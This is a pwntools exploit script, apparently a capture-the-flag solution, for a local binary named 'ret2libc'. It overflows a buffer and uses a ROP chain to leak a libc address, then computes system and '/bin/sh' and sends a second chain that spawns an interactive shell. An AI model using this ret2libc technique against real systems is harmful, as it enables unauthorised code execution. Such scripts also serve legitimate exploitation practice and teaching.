from pwn import * 
context.arch = 'amd64'

r = process('./ret2libc', env={"LD_PRELOAD": "./libc.so"})
l = ELF('./libc.so')

pause()

aaa = 'a' * 0x38
pop_rdi = 0x400733
libc_start_main = 0x600ff0
puts_plt = 0x400520
main = 0x400698
# ret = 0x400506

p = flat(aaa,
        pop_rdi,
        libc_start_main,
        puts_plt,
        main)


r.sendlineafter(':D', p)
r.recvline()
libc_start_main_libc = u64(r.recv(6) + '\0\0')

libc_base = libc_start_main_libc - 0x21ab0
system_libc = libc_base  + 0x4f440
bin_sh = l.search('/bin/sh').next() + libc_base
ret = 0x400506

p =flat(aaa,
        ret,
        pop_rdi,
        bin_sh,
        system_libc
        )
r.sendlineafter(':D', p)

r.interactive()


